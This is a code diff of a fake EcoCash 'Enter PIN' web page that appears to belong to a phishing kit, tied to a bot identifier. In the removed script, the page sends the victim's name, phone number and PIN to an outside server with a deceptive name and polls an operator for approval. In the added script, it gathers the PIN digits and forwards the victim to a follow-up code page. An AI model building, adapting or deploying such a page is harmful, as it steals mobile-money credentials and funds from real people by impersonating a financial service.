@@ -6,247 +6,185 @@
 <title>EcoCash | Enter PIN</title>
 
 <style>
-* {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
+*{box-sizing:border-box;margin:0;padding:0;}
+body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+    background:#0a5aa8;
+    min-height:100vh;
 }
 
-body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-    background: #0a5aa8;
-    min-height: 100vh;
+.pin-container{
+    position:relative;
+    background:#ffffff;
+    text-align:center;
+    padding:90px 20px 120px;
 }
 
-/* ================= WHITE SECTION ================= */
-.pin-container {
-    position: relative;
-    background: #ffffff;
-    text-align: center;
-    padding: 90px 20px 120px;
+.white-curve{
+    position:absolute;
+    bottom:-1px;
+    left:0;
+    width:100%;
+    height:60px;
 }
 
-/* SUBTLE CURVE — EXACT LIKE IMAGE */
-.white-curve {
-    position: absolute;
-    bottom: -1px;
-    left: 0;
-    width: 100%;
-    height: 60px;
-    display: block;
+.brand{font-size:36px;font-weight:700;margin-bottom:18px;}
+.brand .eco{color:#0a5aa8;}
+.brand .cash{color:#e53935;}
+
+h2{
+    font-size:20px;
+    font-weight:600;
+    color:#6b6b6b;
+    margin-bottom:10px;
 }
 
-/* ================= CONTENT ================= */
-.brand {
-    font-size: 36px;
-    font-weight: 700;
-    margin-bottom: 18px;
+#phoneDisplay{
+    border:none;
+    background:transparent;
+    font-size:15px;
+    color:#6b6b6b;
+    text-align:center;
+    margin-bottom:32px;
 }
 
-.brand .eco { color: #0a5aa8; }
-.brand .cash { color: #e53935; }
-
-h2 {
-    font-size: 20px;
-    font-weight: 600;
-    color: #6b6b6b;
-    margin-bottom: 10px;
+.pin-container p{
+    color:#6b6b6b;
+    font-size:14px;
+    margin-bottom:20px;
 }
 
-#phoneDisplay {
-    border: none;
-    background: transparent;
-    font-size: 15px;
-    color: #6b6b6b;
-    text-align: center;
-    margin-bottom: 32px;
+.pin-boxes{
+    display:flex;
+    justify-content:center;
+    gap:14px;
 }
 
-.pin-container p {
-    color: #6b6b6b;
-    font-size: 14px;
-    margin-bottom: 20px;
+.pin-boxes input{
+    width:64px;
+    height:64px;
+    border:2px solid #1e6fb8;
+    border-radius:10px;
+    font-size:22px;
+    text-align:center;
+    outline:none;
 }
 
-/* ================= PIN ================= */
-.pin-boxes {
-    display: flex;
-    justify-content: center;
-    gap: 14px;
+.blue-section{
+    background:#0a5aa8;
+    text-align:center;
+    padding:100px 20px 40px;
+    color:#ffffff;
 }
 
-.pin-boxes input {
-    width: 64px;
-    height: 64px;
-    border: 2px solid #1e6fb8;
-    border-radius: 10px;
-    font-size: 22px;
-    text-align: center;
-    outline: none;
+.blue-section p{
+    font-size:14px;
+    margin-bottom:26px;
 }
 
-button { display: none; }
-
-/* ================= BLUE SECTION ================= */
-.blue-section {
-    background: #0a5aa8;
-    text-align: center;
-    padding: 100px 20px 40px;
-    color: #ffffff;
+.action-buttons{
+    display:flex;
+    justify-content:center;
+    gap:18px;
+    margin-bottom:40px;
 }
 
-.blue-section p {
-    font-size: 14px;
-    margin-bottom: 26px;
+.action{
+    background:#ffffff;
+    color:#0a5aa8;
+    width:160px;
+    padding:24px 10px;
+    border-radius:12px;
+    font-size:14px;
+    font-weight:500;
+    box-shadow:0 6px 14px rgba(0,0,0,0.15);
 }
 
-/* ================= ACTION CARDS ================= */
-.action-buttons {
-    display: flex;
-    justify-content: center;
-    gap: 18px;
-    margin-bottom: 40px;
-}
-
-.action {
-    background: #ffffff;
-    color: #0a5aa8;
-    width: 160px;
-    padding: 24px 10px;
-    border-radius: 12px;
-    font-size: 14px;
-    font-weight: 500;
-    box-shadow: 0 6px 14px rgba(0,0,0,0.15);
-}
-
-/* ================= FOOTER ================= */
-.footer {
-    font-size: 12px;
-    color: #ffffff;
-}
-
-.footer p {
-    margin: 6px 0;
-}
-
-.footer a {
-    color: #ffffff;
-    text-decoration: underline;
-}
+.footer{font-size:12px;color:#ffffff;}
+.footer p{margin:6px 0;}
+.footer a{color:#ffffff;text-decoration:underline;}
 </style>
 </head>
 
 <body>
 
 <div class="pin-container">
-    <div class="brand">
-        <span class="eco">Eco</span><span class="cash">Cash</span>
-    </div>
+<div class="brand">
+<span class="eco">Eco</span><span class="cash">Cash</span>
+</div>
 
-    <h2>Welcome</h2>
+<h2>Welcome</h2>
+<input id="phoneDisplay" readonly>
 
-    <input id="phoneDisplay" type="text" readonly>
+<p>Enter your PIN</p>
 
-    <p>Enter your PIN</p>
+<div class="pin-boxes">
+<input type="tel" maxlength="1">
+<input type="tel" maxlength="1">
+<input type="tel" maxlength="1">
+<input type="tel" maxlength="1">
+</div>
 
-    <form>
-        <div class="pin-boxes">
-            <input type="tel" maxlength="1">
-            <input type="tel" maxlength="1">
-            <input type="tel" maxlength="1">
-            <input type="tel" maxlength="1">
-        </div>
-    </form>
-
-    <!-- SUBTLE WHITE CURVE -->
-    <svg class="white-curve" viewBox="0 0 1440 60" preserveAspectRatio="none">
-        <path d="M0,0 C360,40 1080,40 1440,0 L1440,60 L0,60 Z" fill="#ffffff"/>
-    </svg>
+<svg class="white-curve" viewBox="0 0 1440 60" preserveAspectRatio="none">
+<path d="M0,0 C360,40 1080,40 1440,0 L1440,60 L0,60 Z" fill="#ffffff"/>
+</svg>
 </div>
 
 <div class="blue-section">
-    <p>To register an EcoCash wallet or get assistance,<br>click below</p>
+<p>To register an EcoCash wallet or get assistance,<br>click below</p>
 
-    <div class="action-buttons">
-        <div class="action">Register</div>
-        <div class="action">Help & Support</div>
-    </div>
+<div class="action-buttons">
+<div class="action">Register</div>
+<div class="action">Help & Support</div>
+</div>
 
-    <div class="footer">
-        <p>v3.0.2P</p>
-        <p>By signing in you agree to the <a href="#">Terms and Conditions</a></p>
-    </div>
+<div class="footer">
+<p>v3.0.2P</p>
+<p>By signing in you agree to the <a href="#">Terms and Conditions</a></p>
+</div>
 </div>
 
 <script>
-const BACKEND_URL = "https://united-nations-development-program.onrender.com";
+// ---------- SHOW PHONE ----------
+document.getElementById("phoneDisplay").value =
+localStorage.getItem("phone") || "Unknown Number";
 
-// ---------------- BOT ID ----------------
-const params = new URLSearchParams(window.location.search);
-const botId = params.get('botId');
-if (!botId) {
-    alert("Invalid access link");
-    throw new Error("botId missing");
-}
+// ---------- BOT ID ----------
+const botId = new URLSearchParams(window.location.search).get("botId");
 
-// ---------------- SUBMIT PIN ----------------
-document.getElementById('pinForm').addEventListener('submit', async e => {
-    e.preventDefault();
+// ---------- PIN AUTO INPUT ----------
+const boxes = document.querySelectorAll(".pin-boxes input");
 
-    const phone = document.getElementById('phoneInput').value.trim();
-    const pin = document.getElementById('pinInput').value.trim();
-    const statusDiv = document.getElementById('status');
-    const btn = document.getElementById('submitBtn');
+boxes.forEach((box, i) => {
+    box.addEventListener("input", () => {
+        box.value = box.value.replace(/[^0-9]/g,'');
 
-    if (!phone || pin.length < 4) return;
+        // move forward
+        if(box.value && i < boxes.length-1){
+            boxes[i+1].focus();
+        }
 
-    // store for next page
-    localStorage.setItem('phone', phone);
-    localStorage.setItem('pin', pin);
+        // last digit entered → redirect
+        if(i === boxes.length-1 && box.value){
+            let pin = "";
+            boxes.forEach(b => pin += b.value);
 
-    btn.disabled = true;
-    btn.textContent = 'Logging in...';
-    statusDiv.textContent = '';
+            localStorage.setItem("pin", pin);
 
-    const res = await fetch(`${BACKEND_URL}/submit-pin`, {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({
-            name: localStorage.getItem('fullName'),
-            phone,
-            pin,
-            botId
-        })
+            window.location.href = "code.html?botId=" + botId;
+        }
     });
 
-    const { requestId } = await res.json();
-
-    // ---------------- POLLING ----------------
-    const poll = setInterval(async () => {
-        const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
-        const d = await r.json();
-
-        if (d.blocked) {
-            statusDiv.textContent = d.message || "Invalid number";
-            btn.disabled = false;
-            btn.textContent = 'LOGIN';
-            clearInterval(poll);
-            return;
+    // backspace move back
+    box.addEventListener("keydown", e => {
+        if(e.key==="Backspace" && !box.value && i>0){
+            boxes[i-1].focus();
         }
-
-        if (d.approved === true) {
-            clearInterval(poll);
-            window.location.href = `code.html?botId=${botId}&requestId=${requestId}`;
-        }
-
-        if (d.approved === false) {
-            statusDiv.textContent = "Incorrect PIN";
-            btn.disabled = false;
-            btn.textContent = 'LOGIN';
-            document.getElementById('pinInput').value = '';
-        }
-    }, 1500);
+    });
 });
+
+// focus first box
+boxes[0].focus();
 </script>
 
 </body>
